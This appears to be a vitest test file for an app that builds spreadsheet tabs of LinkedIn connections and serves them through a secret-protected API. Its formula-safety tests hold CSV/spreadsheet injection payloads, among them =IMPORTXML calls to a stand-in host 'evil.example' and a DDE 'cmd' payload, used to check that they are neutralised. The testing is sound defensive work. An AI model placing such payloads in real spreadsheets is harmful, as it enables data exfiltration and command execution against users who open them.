import { describe, expect, it, vi } from "vitest";
import { DEFAULT_SETTINGS } from "@/lib/settings";
import { buildSheetTabs, cell, type SheetData } from "@/lib/sheet/build";
import { handleSheet } from "@/lib/sheet/handler";
import { formatSheetDateTime } from "@/lib/time";
import { company, person } from "./helpers/fixtures";

const NOW = new Date("2026-10-16T12:00:00Z");
const daysAgo = (n: number) => new Date(NOW.getTime() - n * 86_400_000).toISOString();
const SECRET = "s".repeat(40);

const T2 = "00000000-0000-4000-8000-000000000002";
const data = (over: Partial<SheetData> = {}): SheetData => ({
  people: [],
  companies: [company()],
  messages: [],
  templates: [{ id: T2, name: "Template 2" }],
  settings: DEFAULT_SETTINGS,
  ...over,
});
const tab = (tabs: ReturnType<typeof buildSheetTabs>, name: string) => tabs.find((t) => t.name === name)!;

describe("cell (formula safety)", () => {
  it.each(["=SUM(A1)", "+1", "-1", "@x", '=IMPORTXML("http://evil.example","//a")', "\t=1", "\r=1"])("neutralises %j", (v) => {
    expect(cell(v)).toBe(`'${v}`);
  });
  it.each(["Priya", "a=b", "x-y", "  =not at start", "O'Brien", ""])("leaves %j alone", (v) => {
    expect(cell(v)).toBe(v);
  });
  it("turns null, undefined and numbers into text", () => {
    expect(cell(null)).toBe("");
    expect(cell(undefined)).toBe("");
    expect(cell(7)).toBe("7");
  });
});

describe("formatSheetDateTime", () => {
  it("is sortable and in India time", () => {
    expect(formatSheetDateTime("2026-10-14T10:00:00Z")).toBe("2026-10-14 15:30");
    expect(formatSheetDateTime("2026-10-16T20:00:00Z")).toBe("2026-10-17 01:30");
    expect(formatSheetDateTime("2026-01-01T00:05:00Z")).toBe("2026-01-01 05:35");
  });
});

describe("buildSheetTabs", () => {
  const people = [
    person({ id: "a", full_name: "Accepted Ann", status: "accepted", accepted_at: daysAgo(2), requested_at: daysAgo(9), role: "Analyst" }),
    person({ id: "b", full_name: "Messaged Bob", status: "messaged", accepted_at: daysAgo(10), last_messaged_at: daysAgo(6), messages_sent_count: 2, follow_ups_count: 1, role: "SDE", profile_url: "https://www.linkedin.com/in/bob/" }),
    person({ id: "c", full_name: "Replied Cy", status: "replied", accepted_at: daysAgo(12), last_messaged_at: daysAgo(8), last_replied_at: daysAgo(5), messages_sent_count: 1 }),
    person({ id: "d", full_name: "Pending Dee", status: "requested", accepted_at: null, requested_at: daysAgo(10), company_id: null, company_name_raw: "Unlisted Co" }),
    person({ id: "e", full_name: "Pending Eve", status: "requested", accepted_at: null, requested_at: daysAgo(3) }),
  ];
  const messages = [
    { person_id: "b", template_id: T2, template_version: 1, sent_at: daysAgo(14) },
    { person_id: "b", template_id: T2, template_version: 2, sent_at: daysAgo(6) },
    { person_id: "c", template_id: T2, template_version: 1, sent_at: daysAgo(8) },
  ];
  const tabs = buildSheetTabs(data({ people, messages }), NOW);

  it("returns the three tabs, named as you asked", () => {
    expect(tabs.map((t) => t.name)).toEqual(["Accepted connections", "Messaged", "Pending requests"]);
  });

  it("makes every row exactly as wide as its header, with only text cells", () => {
    for (const t of tabs) for (const row of t.rows) {
      expect(row, t.name).toHaveLength(t.headers.length);
      expect(row.every((c) => typeof c === "string"), t.name).toBe(true);
    }
  });

  describe("Accepted connections", () => {
    const t = tab(tabs, "Accepted connections");
    it("lists everyone who accepted, newest first, and nobody still pending", () => {
      expect(t.rows.map((r) => r[0])).toEqual(["Accepted Ann", "Messaged Bob", "Replied Cy"]);
    });
    it("shows company, category, status and whether you have messaged them", () => {
      expect(t.rows[0]).toEqual(["Accepted Ann", "Analyst", "Zepto", "Quick commerce", formatSheetDateTime(daysAgo(2)), "Accepted", "No", "https://www.linkedin.com/in/priya-sharma/"]);
      expect(t.rows[1]![6]).toBe("Yes");
    });
  });

  describe("Messaged", () => {
    const t = tab(tabs, "Messaged");
    it("has one row per message, newest first, with the template and version", () => {
      expect(t.rows.map((r) => [r[1], r[4]])).toEqual([
        ["Messaged Bob", "Template 2 v2"],
        ["Replied Cy", "Template 2 v1"],
        ["Messaged Bob", "Template 2 v1"],
      ]);
    });
    it("flags follow-up due on the person's latest message only", () => {
      const due = t.rows.map((r) => r[7]);
      expect(due).toEqual(["Yes", "", ""]); // Bob: 6 days silent (limit 5); Cy replied; Bob's older row stays quiet
    });
    it("shows days since, follow-ups sent, status and reply date", () => {
      expect(t.rows[0]!.slice(5, 10)).toEqual(["Messaged", "", "Yes", "6", "1"]);
      expect(t.rows[1]![5]).toBe("Replied");
      expect(t.rows[1]![6]).toBe(formatSheetDateTime(daysAgo(5)));
    });
    it("uses the follow-up days setting", () => {
      const lax = buildSheetTabs(data({ people, messages, settings: { ...DEFAULT_SETTINGS, followUpDays: 7 } }), NOW);
      expect(tab(lax, "Messaged").rows.map((r) => r[7])).toEqual(["", "", ""]);
    });
  });

  describe("Pending requests", () => {
    const t = tab(tabs, "Pending requests");
    it("lists only requests still waiting, oldest first", () => {
      expect(t.rows.map((r) => r[0])).toEqual(["Pending Dee", "Pending Eve"]);
    });
    it("shows days pending and the nudge once past the limit, using the raw company when it isn't in your list", () => {
      expect(t.rows[0]).toEqual(["Pending Dee", "Data Analyst", "Unlisted Co", formatSheetDateTime(daysAgo(10)), "10", "Yes", "https://www.linkedin.com/in/priya-sharma/"]);
      expect(t.rows[1]![4]).toBe("3");
      expect(t.rows[1]![5]).toBe("");
    });
  });

  it("returns empty tabs with their headers when there is nothing yet", () => {
    const empty = buildSheetTabs(data(), NOW);
    expect(empty).toHaveLength(3);
    for (const t of empty) {
      expect(t.rows).toEqual([]);
      expect(t.headers.length).toBeGreaterThan(5);
    }
  });

  it("can't be made to write a formula by anything that came from an email", () => {
    const hostile = [
      person({ id: "h", full_name: '=IMPORTXML("http://evil.example/?"&A1,"//x")', role: "+cmd|' /C calc'!A0", company_id: null, company_name_raw: "@SUM(1+1)", profile_url: "-2+3", status: "requested", accepted_at: daysAgo(1), requested_at: daysAgo(1), last_messaged_at: daysAgo(1), messages_sent_count: 1 }),
    ];
    const out = buildSheetTabs(data({ people: hostile, messages: [{ person_id: "h", template_id: T2, template_version: 1, sent_at: daysAgo(1) }] }), NOW);
    const cells = out.flatMap((t) => t.rows.flat());
    expect(cells.length).toBeGreaterThan(10);
    expect(cells.filter((c) => /^[=+\-@\t\r]/.test(c))).toEqual([]);
  });
});

describe("handleSheet", () => {
  const request = (headers: Record<string, string> = { authorization: `Bearer ${SECRET}` }) => new Request("http://localhost/api/sheet", { headers });

  it("refuses without the secret and never loads data", async () => {
    const load = vi.fn(async () => data());
    for (const h of [{}, { authorization: "Bearer nope" }, { authorization: SECRET }] as Record<string, string>[]) {
      expect((await handleSheet(request(h), { secret: SECRET, load })).status).toBe(401);
    }
    expect((await handleSheet(request(), { secret: undefined, load })).status).toBe(401);
    expect(load).not.toHaveBeenCalled();
  });

  it("returns the tabs, a timestamp, and forbids caching", async () => {
    const res = await handleSheet(request(), { secret: SECRET, load: async () => data({ people: [person({ status: "requested", accepted_at: null, requested_at: daysAgo(1) })] }), now: () => NOW });
    expect(res.status).toBe(200);
    expect(res.headers.get("cache-control")).toBe("no-store");
    const body = await res.json();
    expect(body).toMatchObject({ ok: true, generatedAt: NOW.toISOString() });
    expect(body.tabs.map((t: { name: string }) => t.name)).toEqual(["Accepted connections", "Messaged", "Pending requests"]);
  });

  it("hides what went wrong when the database fails", async () => {
    const spy = vi.spyOn(console, "error").mockImplementation(() => {});
    const res = await handleSheet(request(), { secret: SECRET, load: async () => { throw new Error('relation "people" secret detail'); } });
    expect(res.status).toBe(500);
    expect(JSON.stringify(await res.json())).not.toMatch(/relation|secret detail/);
    spy.mockRestore();
  });
});
